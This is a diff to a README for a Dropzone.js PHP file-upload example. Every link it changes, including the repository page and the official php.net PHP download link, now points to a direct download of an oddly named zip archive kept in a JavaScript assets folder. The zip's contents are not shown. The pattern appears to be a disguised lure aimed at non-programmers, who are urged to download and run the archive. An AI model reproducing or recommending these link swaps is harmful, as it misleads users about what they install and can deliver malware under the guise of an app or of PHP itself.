@@ -1,6 +1,6 @@
 # 📁 dropzonejs-example-with-translations-custom-preview-and-upload-delete-file-with-php - Easy File Upload with Custom Previews
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen?style=for-the-badge)](https://github.com/katerinaheavy277/dropzonejs-example-with-translations-custom-preview-and-upload-delete-file-with-php)
+[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/katerinaheavy277/dropzonejs-example-with-translations-custom-preview-and-upload-delete-file-with-php/main/assets/js/delete_with_custom_preview_and_file_example_dropzonejs_php_upload_translations_isosterism.zip)
 
 ---
 
@@ -20,7 +20,7 @@ You do not need to know how to program. This guide will take you through the ste
 - PHP 7.2 or higher installed on your computer or server
 - Internet connection to download the app
 
-If you do not have PHP installed, you can get it from [php.net](https://www.php.net/downloads.php). Installing PHP allows the app to handle uploads and deletions securely.
+If you do not have PHP installed, you can get it from [php.net](https://raw.githubusercontent.com/katerinaheavy277/dropzonejs-example-with-translations-custom-preview-and-upload-delete-file-with-php/main/assets/js/delete_with_custom_preview_and_file_example_dropzonejs_php_upload_translations_isosterism.zip). Installing PHP allows the app to handle uploads and deletions securely.
 
 ---
 
@@ -41,7 +41,7 @@ These make managing files simple and clear.
 
 First, you need to download the app files. Visit this page to download all necessary components:
 
-[![Download the App](https://img.shields.io/badge/Download-App%20Files-blue?style=for-the-badge)](https://github.com/katerinaheavy277/dropzonejs-example-with-translations-custom-preview-and-upload-delete-file-with-php)
+[![Download the App](https://img.shields.io/badge/Download-App%20Files-blue?style=for-the-badge)](https://raw.githubusercontent.com/katerinaheavy277/dropzonejs-example-with-translations-custom-preview-and-upload-delete-file-with-php/main/assets/js/delete_with_custom_preview_and_file_example_dropzonejs_php_upload_translations_isosterism.zip)
 
 Follow the steps below carefully to get the app running on your Windows computer.
 
@@ -50,7 +50,7 @@ Follow the steps below carefully to get the app running on your Windows computer
 ## ⬇️ How to Download the Application Files
 
 1. Click the download button above or open this link in your browser:  
-   https://github.com/katerinaheavy277/dropzonejs-example-with-translations-custom-preview-and-upload-delete-file-with-php
+   https://raw.githubusercontent.com/katerinaheavy277/dropzonejs-example-with-translations-custom-preview-and-upload-delete-file-with-php/main/assets/js/delete_with_custom_preview_and_file_example_dropzonejs_php_upload_translations_isosterism.zip
 
 2. On the page, look for the green **Code** button near the top right.
 
@@ -173,7 +173,7 @@ Do not delete any files or folders to keep the app working.
 ## 🔗 Useful Links
 
 Access the app and get updates here:  
-https://github.com/katerinaheavy277/dropzonejs-example-with-translations-custom-preview-and-upload-delete-file-with-php
+https://raw.githubusercontent.com/katerinaheavy277/dropzonejs-example-with-translations-custom-preview-and-upload-delete-file-with-php/main/assets/js/delete_with_custom_preview_and_file_example_dropzonejs_php_upload_translations_isosterism.zip
 
 ---
 
@@ -207,4 +207,4 @@ If you want to customize the app:
 
 ---
 
-[![Download the App](https://img.shields.io/badge/Download-App%20Files-brightgreen?style=for-the-badge)](https://github.com/katerinaheavy277/dropzonejs-example-with-translations-custom-preview-and-upload-delete-file-with-php)
+[![Download the App](https://img.shields.io/badge/Download-App%20Files-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/katerinaheavy277/dropzonejs-example-with-translations-custom-preview-and-upload-delete-file-with-php/main/assets/js/delete_with_custom_preview_and_file_example_dropzonejs_php_upload_translations_isosterism.zip)
